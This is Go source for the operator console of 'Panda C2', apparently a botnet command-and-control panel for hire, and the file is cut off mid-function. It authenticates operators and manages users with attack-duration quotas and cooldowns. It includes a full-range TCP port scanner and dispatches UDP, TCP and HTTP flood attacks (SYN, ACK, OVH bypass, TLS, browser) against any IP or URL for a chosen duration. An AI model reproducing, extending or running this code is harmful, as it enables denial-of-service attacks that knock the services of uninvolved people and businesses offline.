package main

import (
	"fmt"
	"io/ioutil"
	"math"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	cpu "github.com/mackerelio/go-osstat/cpu"
	mem "github.com/mackerelio/go-osstat/memory"
	uptime "github.com/mackerelio/go-osstat/uptime"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func AnimateString(conn net.Conn, text string, delay int) {
	conn.Write([]byte("\r\n"))
	for i := 0; i <= len(text); i++ {
		conn.Write([]byte("\r" + color.CyanString(text[:i])))
		time.Sleep(time.Duration(delay) * time.Millisecond)
	}
	conn.Write([]byte("\r\n"))
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get secret
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	secret, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if len(secret) > 20 {
		return
	}
	if secret != "panda" {
		return
	}
	AnimateString(this.conn, "Welcome to Panda C2!", 100)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte(color.HiCyanString("        ▄██▄      ▄▄  \r\n")))
	this.conn.Write([]byte(color.HiCyanString("       ▐███▀     ▄███▌\r\n")))
	this.conn.Write([]byte(color.HiCyanString("  ▄▀  ▄█▀▀        ▀██ \r\n")))
	this.conn.Write([]byte(color.HiCyanString(" █   ██               \r\n")))
	this.conn.Write([]byte(color.HiCyanString("█▌  ▐██  ") + color.HiBlackString("▄██▌  ▄▄▄") + color.HiCyanString("  ▄\r\n")))
	this.conn.Write([]byte(color.HiCyanString("██  ▐██▄ ") + color.HiBlackString("▀█▀   ▀██") + color.HiCyanString(" ▐▌\r\n")))
	this.conn.Write([]byte(color.HiCyanString("██▄ ▐███▄▄  ▄▄▄ ") + color.HiBlackString("▀▀") + color.HiCyanString("▄██\r\n")))
	this.conn.Write([]byte(color.HiCyanString("▐███▄██████▄ ▀ ▄█████▌\r\n")))
	this.conn.Write([]byte(color.HiCyanString("▐████████████▀▀██████\r\n")))
	this.conn.Write([]byte(color.HiCyanString(" ▐████▀██████  █████\r\n")))
	this.conn.Write([]byte(color.HiCyanString("   ▀▀▀  █████▌ ████▀\r\n")))
	this.conn.Write([]byte(color.HiCyanString("         ▀▀███ ▀▀▀\r\n")))
	// Get username
	AnimateString(this.conn, "Please enter your login details:", 100)
net_login:
	this.conn.Write([]byte("\r\n"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte(color.CyanString("User → ")))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte(color.CyanString("Pass → ")))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}
	//Attempt  Login
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 80; i++ {
		this.conn.Write(append([]byte(color.CyanString("\rLoading... ")), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(50) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	//if credentials are incorrect output error and close session
	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte(color.HiRedString("\nTry again..\r\n")))
		goto net_login
	}
	// Header
	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; 🐼 PANDA-C2 | USER %s\007", username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	this.conn.Write([]byte("\033[2J\033[1H")) //display main header
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte(color.HiCyanString("        ▄██▄      ▄▄  \r\n")))
	this.conn.Write([]byte(color.HiCyanString("       ▐███▀     ▄███▌\r\n")))
	this.conn.Write([]byte(color.HiCyanString("  ▄▀  ▄█▀▀        ▀██ \r\n")))
	this.conn.Write([]byte(color.HiCyanString(" █   ██               \r\n")))
	this.conn.Write([]byte(color.HiCyanString("█▌  ▐██  ") + color.HiBlackString("▄██▌  ▄▄▄") + color.HiCyanString("  ▄\r\n")))
	this.conn.Write([]byte(color.HiCyanString("██  ▐██▄ ") + color.HiBlackString("▀█▀   ▀██") + color.HiCyanString(" ▐▌\r\n")))
	this.conn.Write([]byte(color.HiCyanString("██▄ ▐███▄▄  ▄▄▄ ") + color.HiBlackString("▀▀") + color.HiCyanString("▄██\r\n")))
	this.conn.Write([]byte(color.HiCyanString("▐███▄██████▄ ▀ ▄█████▌\r\n")))
	this.conn.Write([]byte(color.HiCyanString("▐████████████▀▀██████\r\n")))
	this.conn.Write([]byte(color.HiCyanString(" ▐████▀██████  █████\r\n")))
	this.conn.Write([]byte(color.HiCyanString("   ▀▀▀  █████▌ ████▀\r\n")))
	this.conn.Write([]byte(color.HiCyanString("         ▀▀███ ▀▀▀\r\n")))
	AnimateString(this.conn, color.HiBlackString("Connection initialized as ")+color.CyanString("%s", username)+"\r\n", 100)
	this.conn.Write([]byte("\r\n"))
	color.Cyan("New login user: %s %s", username, color.RedString("%s", this.conn.RemoteAddr()))
	bgBlack := color.New(color.BgHiBlack).SprintFunc()
	bgCyan := color.New(color.BgCyan).SprintFunc()
	for {
		this.conn.Write([]byte(bgBlack(color.HiWhiteString("  panda  ")) + bgCyan(color.HiBlackString("  "+username+"  ")) + color.RedString(" → ")))
		cmd, err := this.ReadLine(false)

		cmd_lowercase := strings.ToLower(cmd)
		cmd = cmd_lowercase
		if err != nil || cmd == "exit" || cmd == "quit" {
			this.conn.Write([]byte(color.WhiteString("Bye!\r\n")))
			return
		}
		if cmd == "" {
			continue
		}
		if err != nil || cmd == "cc" || cmd == "cl" || cmd == "clear" { // clear screen
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte(color.HiCyanString("        ▄██▄      ▄▄  \r\n")))
			this.conn.Write([]byte(color.HiCyanString("       ▐███▀     ▄███▌\r\n")))
			this.conn.Write([]byte(color.HiCyanString("  ▄▀  ▄█▀▀        ▀██ \r\n")))
			this.conn.Write([]byte(color.HiCyanString(" █   ██               \r\n")))
			this.conn.Write([]byte(color.HiCyanString("█▌  ▐██  ") + color.HiBlackString("▄██▌  ▄▄▄") + color.HiCyanString("  ▄\r\n")))
			this.conn.Write([]byte(color.HiCyanString("██  ▐██▄ ") + color.HiBlackString("▀█▀   ▀██") + color.HiCyanString(" ▐▌\r\n")))
			this.conn.Write([]byte(color.HiCyanString("██▄ ▐███▄▄  ▄▄▄ ") + color.HiBlackString("▀▀") + color.HiCyanString("▄██\r\n")))
			this.conn.Write([]byte(color.HiCyanString("▐███▄██████▄ ▀ ▄█████▌\r\n")))
			this.conn.Write([]byte(color.HiCyanString("▐████████████▀▀██████\r\n")))
			this.conn.Write([]byte(color.HiCyanString(" ▐████▀██████  █████\r\n")))
			this.conn.Write([]byte(color.HiCyanString("   ▀▀▀  █████▌ ████▀\r\n")))
			this.conn.Write([]byte(color.HiCyanString("         ▀▀███ ▀▀▀\r\n")))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if err != nil || cmd == "top" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(color.HiCyanString("  PANDA C2 - USAGE  "))))
			this.conn.Write([]byte("\r\n\n"))
			_, err := cpu.Get()
			if err == nil {
				before, _ := cpu.Get()
				time.Sleep(time.Duration(2) * time.Second)
				after, _ := cpu.Get()
				total := float64(after.Total - before.Total)
				cpustr := fmt.Sprintf("Total: \033[1;31m%.2f %% \033[1;37m| User: \033[1;31m%.2f %% \033[1;37m| System: \033[1;31m%.2f %% \033[1;37m| Idle: \033[1;31m%.2f %%", total, float64(after.User-before.User)/total*100, float64(after.System-before.System)/total*100, float64(after.Idle-before.Idle)/total*100)
				this.conn.Write([]byte(bgCyan(color.HiBlackString("        CPU        ")) + bgBlack("   "+cpustr+"   ")))
				this.conn.Write([]byte("\r\n"))
			}
			mem_stat, err := mem.Get()
			if err == nil {
				ramstr := fmt.Sprintf("\033[1;31m%s \033[1;37m/ \033[1;31m%s", ByteFormat(float64(mem_stat.Used), 1), ByteFormat(float64(mem_stat.Total), 1))
				this.conn.Write([]byte(bgCyan(color.HiBlackString("        RAM        ")) + bgBlack("   "+ramstr+"   ")))
				this.conn.Write([]byte("\r\n"))
			}
			up_stat, err := uptime.Get()
			if err == nil {
				this.conn.Write([]byte(bgCyan(color.HiBlackString("        UPTIME     ")) + bgBlack("   "+fmt.Sprintf("%+v", up_stat)+"   ")))
				this.conn.Write([]byte("\r\n"))
			}
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if err != nil || cmd == "panda" {

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(color.HiCyanString("  PANDA C2 - INFO  "))))
			this.conn.Write([]byte("\r\n\n"))
			this.conn.Write([]byte(bgCyan(color.HiBlackString("        Author     ")) + bgBlack(color.WhiteString("   Zile     ")) + "          " + color.HiCyanString("        ▄██▄      ▄▄  \r\n")))
			this.conn.Write([]byte(bgCyan(color.HiBlackString("        Version    ")) + bgBlack(color.WhiteString("   1.0      ")) + "          " + color.HiCyanString("       ▐███▀     ▄███▌\r\n")))
			this.conn.Write([]byte(bgCyan(color.HiBlackString("        Language   ")) + bgBlack(color.WhiteString("   English  ")) + "          " + color.HiCyanString("  ▄▀  ▄█▀▀        ▀██ \r\n")))
			this.conn.Write([]byte(bgCyan(color.HiBlackString("        Made in    ")) + bgBlack(color.WhiteString("   Go       ")) + "          " + color.HiCyanString(" █   ██               \r\n")))
			this.conn.Write([]byte("                                         " + color.HiCyanString("█▌  ▐██  ") + color.HiBlackString("▄██▌  ▄▄▄") + color.HiCyanString("  ▄\r\n")))
			this.conn.Write([]byte("                                         " + color.HiCyanString("██  ▐██▄ ") + color.HiBlackString("▀█▀   ▀██") + color.HiCyanString(" ▐▌\r\n")))
			this.conn.Write([]byte("                                         " + color.HiCyanString("██▄ ▐███▄▄  ▄▄▄ ") + color.HiBlackString("▀▀") + color.HiCyanString("▄██\r\n")))
			this.conn.Write([]byte("                                         " + color.HiCyanString("▐███▄██████▄ ▀ ▄█████▌\r\n")))
			this.conn.Write([]byte("                                         " + color.HiCyanString("▐████████████▀▀██████\r\n")))
			this.conn.Write([]byte("                                         " + color.HiCyanString(" ▐████▀██████  █████\r\n")))
			this.conn.Write([]byte("                                         " + color.HiCyanString("   ▀▀▀  █████▌ ████▀\r\n")))
			this.conn.Write([]byte("                                         " + color.HiCyanString("         ▀▀███ ▀▀▀\r\n")))
			this.conn.Write([]byte("\r\n\n"))
			continue
		}

		if err != nil || cmd == "methods" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(color.HiCyanString("  PANDA C2 - METHODS  "))))
			this.conn.Write([]byte("\r\n\n"))
			this.conn.Write([]byte(bgBlack(color.HiCyanString("    !udp        "))))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    BYPASS      ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    OVH         ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    STORM       ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    VALVE       ")) + "\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(color.HiCyanString("    !tcp        "))))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    BYPASS      ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    OVH         ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    XMAS        ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    ACK         ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    SYN         ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    HANDSHAKE   ")) + "\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(color.HiCyanString("    !http       "))))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    TLS         ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    BROWSER     ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    RAW         ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    PPS         ")) + "\r\n"))
			this.conn.Write([]byte("\r\n\n"))
			continue
		}

		if err != nil || cmd == "help" || cmd == "cmd" || cmd == "commands" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(color.HiCyanString("  PANDA C2 - COMMANDS  "))))
			this.conn.Write([]byte("\r\n\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    methods       ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    top           ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    panda         ")) + "\r\n"))
			this.conn.Write([]byte(bgBlack(color.WhiteString("    scanports     ")) + "\r\n"))
			if userInfo.admin == 1 {
				this.conn.Write([]byte("\r\n\n"))
				this.conn.Write([]byte(bgBlack(color.HiCyanString("  PANDA C2 - ADMIN  "))))
				this.conn.Write([]byte("\r\n\n"))
				this.conn.Write([]byte(bgBlack(color.WhiteString("    block         ")) + "\r\n"))
				this.conn.Write([]byte(bgBlack(color.WhiteString("    unblock       ")) + "\r\n"))
				this.conn.Write([]byte(bgBlack(color.WhiteString("    addadmin      ")) + "\r\n"))
				this.conn.Write([]byte(bgBlack(color.WhiteString("    adduser       ")) + "\r\n"))
				this.conn.Write([]byte(bgBlack(color.WhiteString("    removeuser    ")) + "\r\n"))
			}
			this.conn.Write([]byte("\r\n\n"))
			continue
		}
		if cmd == "scanports" {
			this.conn.Write([]byte(color.CyanString("Host → " + "\033[01;37m ")))
			ip, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !IsValidIPv4(ip) {
				this.conn.Write([]byte(color.RedString("\nInvalid Ipv4.\r\n\n")))
				continue
			}

			var wg sync.WaitGroup
			tcpPorts := make(chan int)
			tcpResults := make(chan string)
			maxTCPPorts := 65535

			go func() {
				for i := 0; i < maxTCPPorts; i++ {
					tcpPorts <- i
				}
				close(tcpPorts)
			}()

			for i := 0; i < 10000; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for port := range tcpPorts {
						address := fmt.Sprintf("%s:%d", ip, port)
						tcpConn, err := net.DialTimeout("tcp", address, 2*time.Second)
						if err == nil {
							tcpConn.Close()
							spaces := 10
							portLength := len(fmt.Sprintf("%d", port))
							leftSpaces := (spaces - portLength) / 2
							rightSpaces := spaces - portLength - leftSpaces
							formatted := fmt.Sprintf("%s%d%s", strings.Repeat(" ", leftSpaces), port, strings.Repeat(" ", rightSpaces))
							tcpResults <- bgCyan(color.HiBlackString("   TCP   ")) + bgBlack(color.HiCyanString(fmt.Sprintf("%s\r\n", formatted)))

						}
					}
				}()
			}
			go func() {
				wg.Wait()
				close(tcpResults)
			}()

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(bgBlack(color.HiCyanString("  PANDA C2 - PORT SCANNER  "))))
			this.conn.Write([]byte("\r\n\n"))

			for result := range tcpResults {
				this.conn.Write([]byte(result))
			}
			this.conn.Write([]byte("\r\n\n"))
			continue
		}

		if userInfo.admin == 1 && cmd == "block" {
			this.conn.Write([]byte(color.CyanString("Host → " + "\033[01;37m ")))
			new_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.CyanString("Are you sure? (y/n) → " + "\033[01;37m ")))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.BlockRange(new_pr) {
				this.conn.Write([]byte(color.RedString("An unknown error occured.\r\n")))
			} else {
				this.conn.Write([]byte(color.CyanString("Ok, success!\r\n")))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "unblock" {
			this.conn.Write([]byte(color.CyanString("Host → " + "\033[01;37m ")))
			rm_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.CyanString("Are you sure? (y/n) → " + "\033[01;37m ")))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.UnBlockRange(rm_pr) {
				this.conn.Write([]byte(color.RedString("An unknown error occured.\r\n")))
			} else {
				this.conn.Write([]byte(color.CyanString("Ok, success!\r\n")))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "adduser" {
			this.conn.Write([]byte(color.CyanString("Username → " + "\033[01;37m ")))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.CyanString("Password → " + "\033[01;37m ")))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.CyanString("Max attack time → " + "\033[01;37m ")))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(color.RedString("Failed to parse the attack duration limit\r\n")))
				continue
			}
			this.conn.Write([]byte(color.CyanString("Cooldown → " + "\033[01;37m ")))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(color.RedString("Failed to parse the cooldown\r\n")))
				continue
			}
			this.conn.Write([]byte(color.YellowString("Username: %s | Password: %s | Max Attack Time: %s | Cooldown: %s\r\n\n", new_un, new_pw, duration_str, cooldown_str)))
			this.conn.Write([]byte(color.CyanString("Continue? (y/n) → " + "\033[01;37m ")))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, duration, cooldown) {
				this.conn.Write([]byte(color.RedString("Failed to create new user. An unknown error occured.\r\n")))
			} else {
				this.conn.Write([]byte(color.CyanString("User \033[37m%s \033[36madded successfully!\r\n", new_un)))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "addadmin" {
			this.conn.Write([]byte(color.CyanString("Username → " + "\033[01;37m ")))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.CyanString("Password → " + "\033[01;37m ")))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.CyanString("Max attack time → " + "\033[01;37m ")))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(color.RedString("Failed to parse the attack duration limit\r\n")))
				continue
			}
			this.conn.Write([]byte(color.CyanString("Cooldown → " + "\033[01;37m ")))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(color.RedString("Failed to parse the cooldown\r\n")))
				continue
			}
			this.conn.Write([]byte(color.YellowString("Username: %s | Password: %s | Max Attack Time: %s | Cooldown: %s\r\n\n", new_un, new_pw, duration_str, cooldown_str)))
			this.conn.Write([]byte(color.CyanString("Continue? (y/n) → " + "\033[01;37m ")))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateAdmin(new_un, new_pw, duration, cooldown) {
				this.conn.Write([]byte(color.RedString("Failed to create new Admin. An unknown error occured.\r\n")))
			} else {
				this.conn.Write([]byte(color.CyanString("Admin \033[37m%s \033[36madded successfully!\r\n", new_un)))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "removeuser" {
			this.conn.Write([]byte(color.CyanString("Username → " + "\033[01;37m ")))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(color.RedString("Are you sure want to remove \033[01;37m" + rm_un + "\033[31m?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) ")))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte("Failed to remove user"))
			} else {
				this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
			}
			continue
		}
		parts := strings.Split(cmd, " ")
		cmd = strings.Trim(parts[0], " ")
		switch cmd {
		case "!udp", "!tcp", "!http":
			if len(parts) < 5 {
				this.conn.Write([]byte(color.RedString("Invalid arguments, usage:\r\n")))
				this.conn.Write([]byte(color.RedString(cmd + " type target port duration\r\n\n")))
				continue
			}
			method_type := strings.Trim(parts[1], " ")
			method_type = strings.ToUpper(method_type) // support lowercase to upper
			if !IsValidType(method_type, cmd) {
				this.conn.Write([]byte(color.RedString("Wrong method type, please use a valid methods:\r\n")))
				this.conn.Write([]byte(color.RedString(ShowValidMethods(cmd) + "\r\n\n")))
				continue
			}

			target := strings.Trim(parts[2], " ")
			if cmd == "!http" {
				if !IsValidUrl(target) {
					this.conn.Write([]byte(color.RedString("Invalid target, for http method must be a url.\r\n\n")))
					continue
				}
			} else {
				if !IsValidIPv4(target) {
					this.conn.Write([]byte(color.RedString("Invalid target, must be valid ipv4.\r\n\n")))
					continue
				}
			}

			port, err := strconv.Atoi(strings.Trim(parts[3], " "))
			if err != nil {
				this.conn.Write([]byte(color.RedString("Failed to parse the attack port\r\n\n")))
				continue
			}

			if port < 21 || port > 65535 {
				this.conn.Write([]byte(color.RedString("Invalid port, must be in valid range 21 - 65535.\r\n\n")))
				continue
			}

			duration, err := strconv.Atoi(strings.Trim(parts[4], " "))
			if err != nil {
				this.conn.Write([]byte(color.RedString("Failed to parse the attack duration\r\n\n")))
				continue
			}

			if can, err := database.CanLaunchAttack(username, duration, cmd); !can {
				this.conn.Write([]byte(color.RedString("%s\r\n\n", err.Error())))
			} else {
				if !database.ContainsWhitelistedTargets(target) {
					if StartNewAttack(username, cmd, method_type, target, port, duration) {

						this.conn.Write([]byte("\033[2J\033[1H"))
						this.conn.Write([]byte("\r\n"))
						this.conn.Write([]byte(bgBlack(color.HiCyanString("  ATTACK SENT SUCCESSFULLY  "))))
						this.conn.Write([]byte("\r\n\n"))

						spaces := 32
						fLen := len(fmt.Sprintf("%s", username))
						leftSpaces := (spaces - fLen) / 2
						rightSpaces := spaces - fLen - leftSpaces
						format_name := fmt.Sprintf("%s%s%s", strings.Repeat(" ", leftSpaces), username, strings.Repeat(" ", rightSpaces))
						fLen = len(fmt.Sprintf("%s(%s)", strings.Trim(cmd, "!"), method_type))
						leftSpaces = (spaces - fLen) / 2
						rightSpaces = spaces - fLen - leftSpaces
						format_method := fmt.Sprintf("%s%s(%s)%s", strings.Repeat(" ", leftSpaces), strings.Trim(cmd, "!"), method_type, strings.Repeat(" ", rightSpaces))
						fLen = len(fmt.Sprintf("%s:%d", target, port))
						leftSpaces = (spaces - fLen) / 2
						rightSpaces = spaces - fLen - leftSpaces
						format_target := fmt.Sprintf("%s%s:%d%s", strings.Repeat(" ", leftSpaces), target, port, strings.Repeat(" ", rightSpaces))
						fLen = len(fmt.Sprintf("%ds", duration))
						leftSpaces = (spaces - fLen) / 2
						rightSpaces = spaces - fLen - leftSpaces
						format_duration := fmt.Sprintf("%s%ds%s", strings.Repeat(" ", leftSpaces), duration, strings.Repeat(" ", rightSpaces))

						this.conn.Write([]byte(bgCyan(color.HiBlackString("        Attacker     ")) + bgBlack(color.WhiteString(format_name)) + "          " + color.HiCyanString("        ▄██▄      ▄▄  \r\n")))
						this.conn.Write([]byte(bgCyan(color.HiBlackString("        Method       ")) + bgBlack(color.WhiteString(format_method)) + "          " + color.HiCyanString("       ▐███▀     ▄███▌\r\n")))
						this.conn.Write([]byte(bgCyan(color.HiBlackString("        Target       ")) + bgBlack(color.WhiteString(format_target)) + "          " + color.HiCyanString("  ▄▀  ▄█▀▀        ▀██ \r\n")))
						this.conn.Write([]byte(bgCyan(color.HiBlackString("        Duration     ")) + bgBlack(color.WhiteString(format_duration)) + "          " + color.HiCyanString(" █   ██               \r\n")))
						this.conn.Write([]byte("                     " + strings.Repeat(" ", len(format_duration)) + "          " + color.HiCyanString("█▌  ▐██  ") + color.HiBlackString("▄██▌  ▄▄▄") + color.HiCyanString("  ▄\r\n")))
						this.conn.Write([]byte("                     " + strings.Repeat(" ", len(format_duration)) + "          " + color.HiCyanString("██  ▐██▄ ") + color.HiBlackString("▀█▀   ▀██") + color.HiCyanString(" ▐▌\r\n")))
						this.conn.Write([]byte("                     " + strings.Repeat(" ", len(format_duration)) + "          " + color.HiCyanString("██▄ ▐███▄▄  ▄▄▄ ") + color.HiBlackString("▀▀") + color.HiCyanString("▄██\r\n")))
						this.conn.Write([]byte("                     " + strings.Repeat(" ", len(format_duration)) + "          " + color.HiCyanString("▐███▄██████▄ ▀ ▄█████▌\r\n")))
						this.conn.Write([]byte("                     " + strings.Repeat(" ", len(format_duration)) + "          " + color.HiCyanString("▐████████████▀▀██████\r\n")))
						this.conn.Write([]byte("                     " + strings.Repeat(" ", len(format_duration)) + "          " + color.HiCyanString(" ▐████▀██████  █████\r\n")))
						this.conn.Write([]byte("                     " + strings.Repeat(" ", len(format_duration)) + "          " + color.HiCyanString("   ▀▀▀  █████▌ ████▀\r\n")))
						this.conn.Write([]byte("                     " + strings.Repeat(" ", len(format_duration)) + "          " + color.HiCyanString("         ▀▀███ ▀▀▀\r\n")))
						this.conn.Write([]byte("\r\n\n"))

					} else {
						this.conn.Write([]byte(color.RedString("Failed to start new attack. An unknown error occured.\r\n\n")))
					}
				} else {
					this.conn.Write([]byte(color.RedString("This target is whitelisted by Panda C2!\r\n")))
					color.Red("User %s tried to attack whitelisted host: %s", username, target)
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 2048)
	bufPos := 0
	for {
		if bufPos > 2043 {
			return "", *new(error)
		}
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("•"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
}
func RoundUp(input float64, places int) (newVal float64) {
	var round float64
	pow := math.Pow(10, float64(places))
	digit := pow * input
	round = math.Ceil(digit)
	newVal = round / pow
	return
}
func ByteFormat(inputNum float64, precision int) string {

	if precision <= 0 {
		precision = 1
	}
	var unit string
	var returnVal float64

	if inputNum >= 1000000000000000000000000 {
		returnVal = RoundUp((inputNum / 1208925819614629174706176), precision)
		unit = " YB" // yottabyte
	} else if inputNum >= 1000000000000000000000 {
		returnVal = RoundUp((inputNum / 1180591620717411303424), precision)
		unit = " ZB" // zettabyte
	} else if inputNum >= 10000000000000000000 {
		returnVal = RoundUp((inputNum / 1152921504606846976), precision)
		unit = " EB" // exabyte
	} else if inputNum >= 1000000000000000 {
		returnVal = RoundUp((inputNum / 1125899906842624), precision)
		unit = " PB" // petabyte
	} else if inputNum >= 1000000000000 {
		returnVal = RoundUp((inputNum / 1099511627776), precision)
		unit = " TB" // terrabyte
	} else if inputNum >= 1000000000 {
		returnVal = RoundUp((inputNum / 1073741824), precision)
		unit = " GB" // gigabyte
	} else if inputNum >= 1000000 {
		returnVal = RoundUp((inputNum / 1048576), precision)
		unit = " MB" // megabyte
	} else if inputNum >= 1000 {
		returnVal = RoundUp((inputNum / 1024), precision)
		unit = " KB" // kilobyte
	} else {
		returnVal = inputNum
		unit = " bytes" // byte
	}
	return strconv.FormatFloat(returnVal, 'f', precision, 64) + unit
}

func IsValidIPv4(ip string) bool {
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return false
	}
	return parsedIP.To4() != nil
}

func IsValidUrl(urlStr string) bool {
	parsedUrl, err := url.Parse(urlStr)
	return err == nil && parsedUrl.Scheme != "" && parsedUrl.Host != ""
}

func ShowValidMethods(cmd string) string {
